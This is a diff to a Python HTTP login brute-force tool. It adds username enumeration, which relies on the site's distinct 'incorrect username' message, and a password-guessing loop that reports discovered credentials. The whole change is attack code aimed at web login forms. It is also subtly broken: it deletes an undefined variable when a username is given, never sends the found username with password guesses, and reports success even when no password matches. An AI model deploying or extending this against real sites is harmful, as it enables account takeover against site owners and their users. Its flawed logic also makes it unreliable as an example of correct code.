@@ -46,7 +46,7 @@ def http_target_up(target, headers = None):
     return (success, message)
 
 
-def attack_http(target, wordlist, username = None):
+def attack_http(target, wordlist, userfail, passfail, username = None, thread_count = None, userfield = None, passfield = None):
     """
     Function Name:
         attack_http
@@ -57,8 +57,12 @@ def attack_http(target, wordlist, username = None):
     Input(s):
         target - link to target login page.
         wordlist - wordlist to use for brute-force attack.
+        userfail - incorrect username message to look for.
+        passfail - incorrect password message to look for.
         username - if username is already known, use this. default = None.
         thread_count - number of threads to use for attack. minimum = 1. maximum = 64. default = 10.
+        userfield - name of username field in http form.
+        passfield - name of password field in http form.
     Return(s):
         creds - credentials found. None if not found.
         success - boolean indication of success.
@@ -66,8 +70,48 @@ def attack_http(target, wordlist, username = None):
         (creds, success, message) - return format.
     """
     creds = str()
+    found_pass = None
+    found_user = None
     message = str()
     success = bool()
+
+    try:
+        if username is None:
+            users = gen_passwords(wordlist)
+
+            # Brute Force Username
+            for user in users:
+               success, message = user_worker_http(user, target, userfail, userfield = userfield, passfield = passfield) 
+
+               if success:
+                   found_user = user
+                   break
+        else:
+            found_user = username
+
+        if found_user is None:
+            raise ValueError("No Username Found")
+
+        del(users)
+
+        passwds = gen_passwords(wordlist)
+
+        # Brute Force Password
+        for passwd in passwds:
+            success, message = pass_worker_http(passwd, target, passfail, userfield = userfield, passfield = passfield)
+
+            if success:
+                found_pass = passwd
+                break
+
+        creds = f"{found_user}:{found_pass}"
+        message = f"Credentials Discovered: \"{creds}\""
+        success = True
+    except Exception as e:
+        creds = None
+        message = e
+        success = False
+
     return (creds, success, message)
 
 
